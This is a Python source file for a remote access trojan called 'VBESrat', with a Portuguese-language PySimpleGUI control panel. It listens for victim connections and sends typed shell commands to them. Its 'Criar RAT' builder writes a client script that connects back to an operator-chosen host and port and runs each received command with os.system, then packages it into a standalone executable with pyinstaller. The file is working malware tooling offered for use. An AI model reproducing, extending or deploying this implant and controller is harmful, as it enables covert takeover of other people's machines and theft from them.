
from pathlib import Path
from PySimpleGUI import PySimpleGUI as sg
import os
import socket

ipPadrao = socket.gethostbyname(socket.gethostname())
portaPadrao = 8081
madeBy = 'VBESrat'
version = '1.0'

####### JANELA CONECTAR #########

sg.theme('DarkBlack')
sg.theme_button_color(('white', '#9700FF'))


def init():
    layout = [
        [sg.Text('Host')],
        [sg.Input(ipPadrao, key='host')],
        [sg.Text('Porta')],
        [sg.Input(portaPadrao, key='porta')],
        [sg.Button('Conectar', key='btnConn', size=(40,1), pad=(6,15))]
    ]

    janela = sg.Window(''+ madeBy +' '+ version +' - Conectar', layout, size=(300,180))

    while True:
        eventos, valores = janela.read()
        if eventos == sg.WINDOW_CLOSED:
            break
        
        if eventos == 'btnConn':
            host = valores['host']
            porta = valores['porta']
            conectar(host, porta)






####### SOCKET ##########
def conectar(host, porta):

    porta = int(porta)
    server = socket.socket()
    server.bind((host, porta))
    server.listen(2)
    client, client_addr = server.accept()
    sg.popup("Uma nova conexão foi estabelecida!")
    conectado(client, client_addr)
    
                    
def conectado(client=None, client_addr=None):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))

    menu = [
        ['&RAT', ['&Conectar', '&Novo']],
        ['&Ajuda', ['&GitHub', '&Discord']]
    ]

    layout = [
        [sg.Menu(menu, tearoff=False, key='menu')],
        [sg.Text('Conectado com: '+str(client_addr))],
        [sg.Text('')],
        [sg.Text('')],
        [sg.Text('')],
        [sg.Button('CMD', key='btnCmd', size=(20, 1))],

    ]

    

    janela = sg.Window(''+ madeBy +' '+ version +' - Conectado', layout, size=(900, 600), finalize=True)
    
    
    
    while True:
        
        eventos, valores = janela.read()
        
        if eventos == sg.WINDOW_CLOSED:
            exit()

        if eventos == 'btnCmd':
            cmd(client, client_addr, janela)
        
        if eventos == 'Novo':
            rat(client, client_addr,janela)

        if eventos == 'Conectar':
            init()


def rat(client=None, client_addr=None,janela=None):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))
    
    layout = [
        [sg.Text('Criar RAT')],
        [sg.Text('')],
        [sg.Text('Host', size=(18,1)), sg.Text('Porta', size=(17,1))],
        [sg.Input(ipPadrao, key='inpRatHost', size=(20,2)), sg.Input(portaPadrao, key='inpRatPorta', size=(20,2))],        
        [sg.Text('Nome')],
        [sg.Input(key='inpRatNome', size=(42,2))],
        [sg.Text('')],
        [sg.Button('Criar', key='btnRat')]
    ]

    janelaRat = sg.Window(''+ madeBy +' ' + version + ' - Criar RAT', layout, finalize=True)

    while True:
        event, val = janelaRat.read()
        if event == sg.WIN_CLOSED:
            janelaRat.close()
            janela.close()
            conectado(client, client_addr)
        if event == 'btnRat':
            host = val['inpRatHost']
            porta = val['inpRatPorta']
            nome = val['inpRatNome']
            janelaRat.close()
            novoRat(host, porta, nome)
            

def novoRat(host, porta, nome):
    with open(nome + '.py', "w") as arquivo:
        arquivo.write('import socket\nimport subprocess\nimport os\nHOST=socket.gethostbyname("'+ host +'")\nPORT='+ porta +'\nclient = socket.socket()\nclient.connect((HOST, PORT))\nwhile True:\n    command = client.recv(1024)\n    command = command.decode()\n    os.system(command)')
        
        conv = "pyinstaller --onefile ./"+ nome +".py"
        os.system(conv)

        sg.popup("Criado: "+ nome +".exe")


def cmd(client, client_addr, janela):
    sg.theme('DarkBlack')
    sg.theme_button_color(('white', '#9700FF'))
    
    layout = [
        [sg.Text('Prompt de Comando')],
        [sg.Text('')],
        [sg.Input(key='inpCmd', size=(50,2))],
        [sg.Text('')],
        [sg.Button('Enviar', key='btnEnvCmd')]
    ]

    janelaCmd = sg.Window(''+ madeBy +' ' + version + ' - Prompt de Comando', layout, size=(230,150), finalize=True)

    while True:
        event, val = janelaCmd.read()
        if event == sg.WIN_CLOSED:
            janelaCmd.close()
            janela.close()
            conectado(client, client_addr)
        if event == 'btnEnvCmd':
            command = str(val['inpCmd'])
            while True:
                command = command.encode()
                client.send(command)
                sg.popup("Enviado!")
                janelaCmd.close()
                janela.close()
                conectado(client, client_addr)

            
    
    
    
    
conectado()